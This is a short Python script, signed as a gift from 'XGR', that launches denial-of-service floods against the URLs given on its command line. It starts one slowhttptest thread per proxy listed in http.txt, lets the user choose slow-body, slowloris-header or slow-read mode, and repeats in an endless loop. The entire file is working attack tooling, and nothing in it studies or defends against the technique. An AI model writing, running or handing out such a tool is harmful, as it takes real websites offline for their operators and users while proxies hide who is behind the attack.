#gift from XGR
#!/usr/bin/env python3
import threading
import sys
import re
import time
import os
import urllib.request, urllib.error, urllib.parse
import socket
url = ''
proxy = ''
option = 1
checked_proxy = 0
class myThread(threading.Thread):
    def __init__(self, u, opt, p):
        self.u = u
        self.opt = opt
        self.p = p
        threading.Thread.__init__(self)

    def run(self):
        try:
            print("[+]Attack %s via proxy %s" % (self.u, self.p.replace('\n', '')))
            if self.opt == 1:
                cmd = 'slowhttptest -c 1000 -B -i 110 -r 200 -s 8192 -t FFFFFFUUUUCCCCKKKKYOUUUUUUUU -u %s -x 10 -p 15 -d %s' % (self.u, self.p)
            elif self.opt == 2:
                cmd = 'slowhttptest -c 1000 -H -t GET -i 10 -r 200 -u %s -x 24 -p 15 -d %s' % (self.u, self.p)
            else:
                cmd = 'slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u %s -p 15 -d %s' % (self.u, self.p)
            os.popen(cmd, 'r', 1)
        except KeyboardInterrupt:
            print("[+]Received keyboard interrupt, quitting threads")
        except Exception as detail:
            print("[+]Error: ", detail)

# Define a function for execute slowhttptest
def dos(url, option, proxy):
    try:
        fo = open(proxy, "rb")
        threads = []
        for i in fo.readlines():
            for u in url:
                pos = u.find("https://")
                if pos == 0:
                    p = re.sub(r'[A-Za-z--].*$', "", i.decode())
                    t = myThread(u, option, p)
                    t.start()
                    threads.append(t)
        fo.close()
        for j in threads:
            j.join()
        print("[+]Continue attack")
    except IOError:
        print("[+]Error: Could not open filename, plz check again !!!")

def main():
    if len(sys.argv) < 2:
        sys.exit()
    else:
        global url
        url = sys.argv[1:]
    proxy = "http.txt"
    while 1:
        dos(url, option, proxy)
if __name__ == "__main__":
    main()

